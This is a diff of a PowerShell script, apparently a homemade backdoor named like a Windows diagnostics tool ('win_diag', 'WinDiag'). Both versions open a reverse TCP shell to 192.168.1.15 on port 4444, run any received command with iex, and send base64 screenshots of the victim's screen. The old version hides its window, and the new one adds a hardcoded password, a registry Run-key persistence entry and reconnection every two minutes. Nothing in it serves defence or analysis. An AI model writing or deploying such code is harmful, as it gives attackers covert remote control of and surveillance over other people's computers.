@@ -1,61 +1,89 @@
-# --- CONFIG ---
-$ip = '192.168.1.15'
+$ip = "192.168.1.15"
 $port = 4444
-$installPath = "$env:APPDATA\win_diag.ps1"
+$secret = "biskviti"
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$registryName = "WinDiag"
 
-# --- 1. BOOT LOOP ---
-while($true) {
+function Get-Screenshot {
+    param($StreamWriter)
     try {
-        # Check if hardware Wi-Fi is even "UP" before trying anything
-        while (!( [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() )) {
-            Start-Sleep -Seconds 5
-        }
-
-        # --- 2. DELAYED WINDOW HIDE ---
-        Start-Sleep -Seconds 2
-        try {
-            $s = '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);'
-            $type = Add-Type -M $s -Name "W$([Guid]::NewGuid().ToString().Replace('-',''))" -Pass
-            [void]$type::ShowWindow((gps -id $pid).MainWindowHandle, 0)
-        } catch { }
-
-        # --- 3. CONNECTION ---
-        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
-        $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $w.AutoFlush = $true
-        $r = New-Object System.IO.StreamReader($s)
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
+        $Width  = $Screen.Bounds.Width
+        $Height = $Screen.Bounds.Height
+        $Top    = $Screen.Bounds.Top
+        $Left   = $Screen.Bounds.Left
+        $Bitmap = New-Object System.Drawing.Bitmap -ArgumentList $Width, $Height
+        $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
+        $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
         
-        $w.WriteLine("--- ATOMIC V3.5 + SCREENSHOT ONLINE: $env:COMPUTERNAME ---")
-
-        while($c.Connected) {
-            $w.Write("PS " + (Get-Location).Path + "> ")
-            $line = $r.ReadLine()
-            if ($null -eq $line -or $line -eq "exit") { break }
-            
-            $cmd = $line.Trim()
-
-            # --- 4. SCREENSHOT BRANCH ---
-            if ($cmd -eq "screenshot") {
-                try {
-                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-                    $g = [System.Drawing.Graphics]::FromImage($bmp)
-                    $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-                    $ms = New-Object System.IO.MemoryStream
-                    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-                    $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
-                    $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
-                } catch { $w.WriteLine("Screenshot Error: $($_.Exception.Message)") }
-            } 
-            else {
-                # Normal Command Execution
-                $out = try { iex $line 2>&1 | Out-String } catch { $_.Exception.Message }
-                $w.WriteLine($out)
-            }
-        }
-    } catch { 
-        Start-Sleep -Seconds 20 
-    } finally {
-        if ($c) { $c.Close() }
+        $ms = New-Object System.IO.MemoryStream
+        $Bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+        $Binary = $ms.ToArray()
+        $Base64 = [Convert]::ToBase64String($Binary)
+        
+        $StreamWriter.WriteLine("---SCREENSHOT_START---")
+        $StreamWriter.WriteLine($Base64)
+        $StreamWriter.WriteLine("---SCREENSHOT_END---")
+        
+        $Graphic.Dispose()
+        $Bitmap.Dispose()
+        $ms.Dispose()
+    } catch {
+        $StreamWriter.WriteLine("Screenshot failed: " + $_.Exception.Message)
     }
 }
+
+function Start-AuthShell {
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer.AutoFlush = $true
+
+        # 1. AUTHENTICATION CHALLENGE
+        $writer.WriteLine("PASSWORD REQUIRED:")
+        $timer = [System.Diagnostics.Stopwatch]::StartNew()
+        $authenticated = $false
+
+        while ($timer.Elapsed.TotalSeconds -lt 15) {
+            if ($stream.DataAvailable) {
+                if ($reader.ReadLine() -eq $secret) {
+                    $authenticated = $true
+                    break
+                } else {
+                    # WRONG PASSWORD = SELF DESTRUCT
+                    Remove-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue
+                    $writer.WriteLine("WRONG PASSWORD. PERSISTENCE REMOVED. EXITING.")
+                    exit
+                }
+            }
+            Start-Sleep -Milliseconds 500
+        }
+
+        if ($authenticated) {
+            $writer.WriteLine("ACCESS GRANTED. COMMANDS: 'shot' for screen, 'exit' to close.")
+            
+            while($true) {
+                $writer.Write("B15cu1t@FINKI:" + (Get-Location).Path + "> ")
+                $cmd = $reader.ReadLine()
+                
+                if ($cmd -eq "exit") { break }
+                elseif ($cmd -eq "shot") { Get-Screenshot -StreamWriter $writer }
+                elseif ($null -ne $cmd) {
+                    $val = iex $cmd 2>&1 | Out-String
+                    $writer.WriteLine($val)
+                }
+            }
+        }
+        $client.Close()
+    } catch {
+        # RETRY EVERY 2 MINUTES IF NO LISTENER
+        Start-Sleep -Seconds 120
+        Start-AuthShell
+    }
+}
+
+Start-AuthShell
